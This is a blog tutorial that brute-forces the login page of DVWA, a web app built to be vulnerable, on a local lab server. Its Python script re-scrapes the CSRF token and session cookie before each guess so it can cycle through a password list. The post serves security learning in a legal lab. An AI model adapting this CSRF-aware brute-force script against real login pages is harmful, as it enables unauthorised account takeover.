---
title: Brute forcing DVWA's initial login page 
slug: brute-forcing-dvwas-initial-login-page 
date: 2022-09-17 
updated_at: 2022-09-17 
description: "Although it is quite easy to see write ups for the DVWA's brute force login challenge. Hacking it's actual login page may bring up some challenges to newcomers. Let's understand why and how to circumvent it"
---

Although it is quite easy to see write ups for the DVWA's brute force login challenge. Hacking it's actual login page may bring up some challenges to newcomers. Let's understand why and how to circumvent it!

[Damn Vulnerable Web App, or also known as DVWA](https://github.com/digininja/DVWA), is a PHP/MySQL web application that is purposefully  vulnerable, as the name suggests, to be hacked, tested and serve as a learning playground for people that want to practice their security skills in a legal environment.

When we set up our DVWA server (in this case, I preferred using a docker image to host it for me), and do a initial reset database it will set up and show the default credentials for us: username `admin` and password `password`, pretty common default credentials for a webserver, right? However, if we could not hack, automate and find our way the system, how fun would it really be?

So, this is the first thing we see when we access our DVWA page:
![DVWA Login Page](/blog/assets/DVWA-Login-Page.png)

First things first, let's try to grasp this page and see if we can grab any hints that we could use, for it let's check the network tab as well. You can use another proxy to intercept requests as well, if you'd prefer.

![Highlighted requests](/blog/assets/highlighted-requests.png)

As you can see, I've highlighted somethings in the image above. The request high in blue is the POST request we just made trying to log in. After that, ther server processes the request and redirect us to `login.php` as we can see in the red highlight, with a message of "Login failed", as shown in the yellow highlight in the left. Let's copy the post request as a [cURL](https://curl.se/) command and see how it is formed. 

![Copy request as cURL command](/blog/assets/copy-as-curl.png)

Although cURL commands are pretty useful, I don't find them really easy to read, so let's transform it in a Python request and see how it looks. For that we can use the [cURL converter website](https://curlconverter.com/python/) to do the job for us and its output will look something like this:

```python
import requests

cookies = {
    'PHPSESSID': 'fmpdptokjk1ogvashj9j5usdn4',
    'security': 'low',
}

headers = {
	...
}

data = {
    'username': 'teste',
    'password': '123',
    'Login': 'Login',
    'user_token': 'e877712995a1d2bbae4c622fff7f9b9a',
}

response = requests.post('http://localhost/login.php', cookies=cookies, headers=headers, data=data)
```

Here we can see a few interesting things in the request we made:  a cookie called `PHPSESSID ` and a parameter called `user_token`, if we try to refresh the page and login again we'll see that both of them will have new values. `PHPSESSID` is a a PHP way of setting a session cookie and `user_token` looks like a [CSRF Token](https://portswigger.net/web-security/csrf/tokens), a unique, unpredictable value that the server uses to validate the given request and properly process it if valid. Let's see what happens if we make a few requests without changing its value:

```python
for _ in range(1, 3):
    response = requests.post('http://localhost/login.php', cookies=cookies, headers=headers, data=data)
    print(response.content)
    print("==============")
```

The output we have is:

![Print screen of the invalid CSRF output](/blog/assets/invalid-csrf-token.png)

After the first request, you'll probably see we have a `CSRF token is incorrect` message within its body content, so this confirms our theory! So what can we do to get around it and be able to automatize our requests? 

First of all, we've already seen that every time we load the page a new token is generated for us, we can use that for getting a new token before every new request we make, so let's try making a `GET` request and see what we get.

```python
response = requests.get('http://localhost/login.php')

print(response.content.decode('UTF-8'))
```

And we'll get a tag like this within our response:

```html
<input type=\'hidden\' name=\'user_token\' value=\'faaf19846a466a9f328f2a43a06cfdb6\' />
```

So we can probably extract that using a [regex](https://en.wikipedia.org/wiki/Regular_expression). Let's try that

```python
def get_user_token(body):
    return re.search("user_token\\\' value=\\\'(.+)\\\'", body).group(1)
```

Let's also get the `PHPSESSID` cookie, since we're already getting data from the new request. It is in the Headers, however, we can do it in the same way as the token.

```python
def get_phpsessid(headers):
    return headers['Set-Cookie'].split(';')[0].split('=')[1]
```

And wrap up everything into a single function

```python
def set_request_tokens():
    response = requests.get('http://localhost/login.php')
    cookies['PHPSESSID'] = get_phpsessid(headers=response.headers)
    data['user_token'] = get_user_token(body=response.content.decode('UTF-8'))
```

Let's set a small wordlist of passwords so we can test if we find a successful login.

```python
PASSWORDS = [
    "teste",
    "admin",
    "password",
    "tentativa",
    "aloha",
    "ihuuuu",
    "qwerty",
    "qw12er34ty56"
]
```

so, just to finish our little script, let's build a last function to do the dirty work for us.

```python
def brute_force():
    for i in PASSWORDS:
        set_request_tokens()
        data['password'] = i
        response = requests.post('http://localhost/login.php', cookies=cookies, headers=headers, data=data)
        
        if 'Login failed' in response.content.decode('UTF-8'):
            continue

        print("=================")
        print("Successful Login!")
        print("Credential Found:")
        print(f"- Username: {data['username']}")
        print(f"- Password: {data['password']}")
        print("=================")
```

This function iterates over the PASSWORDS list we've defined earlier, sets the tokens we need for every new request and, finally, do the request. After that we check if there's a `Login failed` message within the reponse content to see if we succeeded or not and then print out the credentials found. The final output will look like this:

![Script output Result](/blog/assets/script-output.png)

## Conclusion

And that will be it! Although it's a very simple hacking problem, some people might run into trouble dealing with those tokens and not understand what's going on. Especially when we try to use tools as Burp Suite or [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra) for brute forcing it, since the results may not be consistent if not set up correctly. You can find the whole script in my [Github](https://github.com/davidpalves/writeups/blob/main/dvwa/dvwa-login.py).

Feel free to comment below any questions, suggestions or relevant points you might have!
